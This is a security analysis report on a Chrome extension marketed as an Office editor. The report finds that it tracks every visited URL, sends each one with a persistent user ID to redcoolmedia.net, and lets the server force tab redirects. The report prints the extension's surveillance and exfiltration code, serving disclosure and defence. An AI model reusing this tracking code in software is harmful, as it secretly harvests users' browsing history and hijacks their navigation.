# Vulnerability Report: Office online OfficeWork for XLS DOC and PPT

## Metadata
- **Extension ID**: aobjedggladklcfbokddfgjkfdioknak
- **Extension Name**: Office online OfficeWork for XLS DOC and PPT
- **Version**: 1.4.4
- **User Count**: ~90,000
- **Manifest Version**: 3
- **Analysis Date**: 2026-02-07

## Executive Summary

**CRITICAL RISK** - This extension implements pervasive surveillance of user browsing activity by tracking and exfiltrating every URL visited to remote servers. The extension automatically sends all visited URLs (excluding those containing "redco") to `stream.redcoolmedia.net` for server-side processing. This behavior is disclosed in small text at the bottom of the popup, but the invasive nature and continuous tracking make this a severe privacy violation affecting 90,000 users.

The extension's stated purpose is to help users edit Office documents, but it operates as comprehensive browsing surveillance software that tracks user navigation across all websites. Every tab activation and URL update triggers data exfiltration to third-party servers.

## Critical Findings

### 1. Comprehensive Browsing Surveillance
**Severity**: CRITICAL
**Files**: `web.js`, `service.js`
**Verdict**: MALICIOUS

The extension implements aggressive URL tracking that monitors all user browsing activity:

```javascript
// web.js lines 20-29
chrome.tabs.onActivated.addListener(function(activeInfo) {
     try  {
        aati = activeInfo.tabId;
        xdii(aati);
      }  catch (error) {}
});

chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    try { xdii(tabId);   }  catch (error) {}
});
```

Every time a user switches tabs or a page updates, the extension captures the URL:

```javascript
// web.js lines 4-14
function xdii(tabId) {
      chrome.tabs.get(tabId, function(tab) {
            if ( ( tab.url.indexOf("redco") == -1 ) && ( tab.url.indexOf("http") !== -1 ) && ( lasiee != tab.url) )  {
                    utyu =  tab.url;
                    rtcc = "";
                    rtcc =   utyu;
                    exx(rtcc);
                    lasiee = tab.url;
            }
      });
}
```

The extension tracks ALL URLs except those containing "redco" (their own domain) and remembers the last URL to avoid duplicate sends.

### 2. Automatic URL Exfiltration to Remote Server
**Severity**: CRITICAL
**Files**: `web.js`
**Verdict**: MALICIOUS

Every captured URL is immediately sent to remote servers in hex-encoded format:

```javascript
// web.js lines 101-116
let rtcx = await fetch('https://stream.redcoolmedia.net/api/officeworku.php?l=' + bin2hex(urly) + '&hex=1&u=' + un);

if (rtcx.status === 200) {
      let dsx = await rtcx.text();
      console.log(dsx);
      var rse2 = dsx;
      if ( rse2.indexOf("302") !== -1 )   {
               var cvcv = 'https://www.redcoolmedia.net/api/app-officework.php?url=' + bin2hex(urly) + '&u=' + un;
                //chrome.tabs.create({ url: cvcv });
               chrome.tabs.update(chrome.tabs.getCurrent().id, {url: cvcv});
     }
}
```

The server receives:
- Every URL visited (hex-encoded)
- A unique user identifier generated by the extension
- The ability to respond with "302" to trigger automatic tab redirection

### 3. Persistent User Tracking with Generated Identifiers
**Severity**: HIGH
**Files**: `web.js`, `apar.js`
**Verdict**: MALICIOUS

The extension generates and stores persistent user identifiers to track users across sessions:

```javascript
// web.js lines 67-91
let storageResult = await chrome.storage.local.get([redcool_key]);

if (redcool_key in storageResult) {
    redxda = storageResult[redcool_key]
}

if ( redxda.usernameredcool ) {
    usernameredcool = redxda.usernameredcool;
}
else {
    usernameredcool = "" + randomString(10) + "".toLowerCase();
    redxda.usernameredcool = usernameredcool;
}
```

This identifier is:
- Automatically generated on first use (10 random characters)
- Persistently stored in chrome.storage.local
- Sent with every URL to enable server-side tracking
- Used to link all browsing activity to a single user profile

### 4. Remote Control Capability - Forced Tab Redirection
**Severity**: HIGH
**Files**: `web.js`
**Verdict**: MALICIOUS

The remote server can force the user's current tab to navigate to arbitrary URLs by responding with "302":

```javascript
// web.js lines 109-113
if ( rse2.indexOf("302") !== -1 )   {
    var cvcv = 'https://www.redcoolmedia.net/api/app-officework.php?url=' + bin2hex(urly) + '&u=' + un;
    chrome.tabs.update(chrome.tabs.getCurrent().id, {url: cvcv});
}
```

This allows the operator to:
- Hijack user navigation
- Redirect users to attacker-controlled pages
- Insert themselves into user browsing flows
- Potentially conduct phishing or interception attacks

### 5. Inadequate Disclosure and Deceptive Opt-Out
**Severity**: HIGH
**Files**: `index.html`, `web.js`, `apar.js`
**Verdict**: DECEPTIVE

While there is disclosure text, it's inadequate for the invasive nature of the tracking:

```html
<!-- index.html line 120 -->
<div style="margin-left: 5px; padding-bottom: 5px;  width: 100%;   padding-top: 5px; font-size: 14px; color: #333333; ">
NOTE: Please note that this extension scans and collects the webpages you browse in the Internet.
These webpages are uploaded to our servers in order to know if they contain Office files that
can be edited using our extension. Refer to our policy about it.
</div>
```

The "Edit Online" checkbox appears to be an opt-out mechanism, but:
- The feature is enabled by default (redcoolonline = "1")
- Even when disabled, the tracking infrastructure remains active in the background worker
- The checkbox only prevents the API call in `exx()`, but all the event listeners remain active
- Most users won't see or understand this small disclaimer at the bottom of the popup

### 6. Excessive Permissions for Stated Functionality
**Severity**: MEDIUM
**Files**: `manifest.json`
**Verdict**: SUSPICIOUS

Permissions requested:
- `storage` - Used for tracking identifier persistence
- `tabs` - Used for comprehensive URL surveillance

The "tabs" permission enables access to all URLs of all tabs, which is excessive for an extension claiming to only help edit Office documents. A legitimate document editor would only need access when users explicitly open files, not continuous surveillance of all browsing.

## Additional Concerns

### 7. File Upload and Remote File Management
**Severity**: MEDIUM
**Files**: `apar.js`
**Verdict**: CONCERNING

The extension implements file upload functionality that sends user files to redcoolmedia.net:

```javascript
// apar.js lines 217-228
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://stream.redcoolmedia.net/onlineeditor/filemanager.php?service=&do=upload&username='+ usernameredcool);
xhr.onload = function() {
    $row.remove();
    list();
};
```

All uploaded files are:
- Sent to third-party servers with the user's tracking identifier
- Stored server-side and associated with the user profile
- Accessible via the remote file manager API

### 8. Third-Party Data Retrieval
**Severity**: LOW
**Files**: `apar.js`
**Verdict**: EXPECTED (for file management features)

The popup makes API calls to retrieve user data:

```javascript
// apar.js lines 49-70
var xhrbb = new XMLHttpRequest();
xhrbb.open('GET', 'https://stream.redcoolmedia.net/api/officeworkb.php?u=' + usernameredcool, true);
```

This retrieves the list of Office files detected on webpages the user has visited, which is expected functionality but relies on the invasive URL tracking described above.

## False Positive Analysis

| Pattern | Location | Verdict | Reason |
|---------|----------|---------|--------|
| jQuery usage | apar.js | Clean | Standard jQuery library for DOM manipulation |
| XMLHttpRequest | apar.js | Clean | Standard API usage for file management |
| chrome.storage API | web.js, apar.js | Expected | Legitimate storage API, but used for tracking |
| Checkbox event handlers | apar.js | Clean | Standard DOM event handling |
| Table sorting logic | apar.js:76-115 | Clean | Client-side table manipulation |
| File size validation | apar.js:201-207 | Clean | Standard file upload validation |

## API Endpoints and Data Flows

| Endpoint | Purpose | Data Sent | Risk Level |
|----------|---------|-----------|------------|
| `https://stream.redcoolmedia.net/api/officeworku.php` | URL tracking | Hex-encoded URL, user ID | CRITICAL |
| `https://www.redcoolmedia.net/api/app-officework.php` | Redirect target | Hex-encoded URL, user ID | HIGH |
| `https://stream.redcoolmedia.net/api/officeworkb.php` | File list retrieval | User ID | MEDIUM |
| `https://stream.redcoolmedia.net/onlineeditor/filemanager.php` | File operations | User files, user ID | MEDIUM |
| `https://www.redcoolmedia.net/provisioning/prenew*.php` | New document creation | User ID | LOW |

## Data Flow Summary

1. **User browses the web** → Extension captures ALL URLs via tabs API
2. **URL captured** → Hex-encoded and sent to stream.redcoolmedia.net with persistent user ID
3. **Server processes URL** → Can respond with "302" to hijack the user's current tab
4. **Server builds profile** → All visited URLs linked to single user identifier across all sessions
5. **Files uploaded** → User documents sent to remote servers with tracking identifier
6. **Persistent tracking** → User ID stored locally and used for all requests

The extension essentially implements a comprehensive web surveillance system disguised as an Office document editor.

## Security Impact Assessment

### Privacy Impact
- **CRITICAL**: Complete browsing history exfiltration to third-party servers
- **HIGH**: Persistent cross-session user tracking via generated identifiers
- **MEDIUM**: User document uploads stored on third-party servers

### Security Impact
- **HIGH**: Remote server can hijack user tabs and force navigation
- **MEDIUM**: Potential for phishing via forced redirects
- **MEDIUM**: User documents exposed to third-party servers

### User Trust Impact
- **HIGH**: Deceptive practices - marketed as document editor, operates as surveillance tool
- **MEDIUM**: Inadequate disclosure of invasive tracking
- **LOW**: Default-enabled tracking with unclear opt-out mechanism

## Recommendations

For Users:
1. **IMMEDIATELY UNINSTALL** this extension
2. Assume all browsing activity while extension was installed has been collected
3. Consider changing passwords for sensitive accounts accessed during extension installation
4. Review browser history and assess what sensitive information may have been exposed

For Platform:
1. **REMOVE FROM STORE** - This extension violates user privacy expectations
2. Investigate the developer's other extensions for similar behavior
3. Review disclosure requirements for extensions with browsing surveillance capabilities
4. Consider restricting tabs permission for extensions claiming document editing functionality

## Overall Risk Assessment

**RISK LEVEL: CRITICAL**

This extension represents a severe privacy violation that affects 90,000 users. While technically disclosed in small print, the extension's core functionality is comprehensive browsing surveillance, not Office document editing. The combination of:

- Pervasive URL tracking across all websites
- Persistent user identification across sessions
- Automatic exfiltration of all browsing data to remote servers
- Remote control capability via forced tab redirects
- Default-enabled tracking with inadequate disclosure
- Deceptive marketing (Office editor vs. surveillance tool)

...makes this a critical security and privacy threat that warrants immediate removal from the Chrome Web Store.

The extension's behavior pattern matches commercial surveillance software and browsing data harvesting operations. Users are likely unaware that their complete browsing history is being continuously uploaded to third-party servers and linked to persistent identifiers.
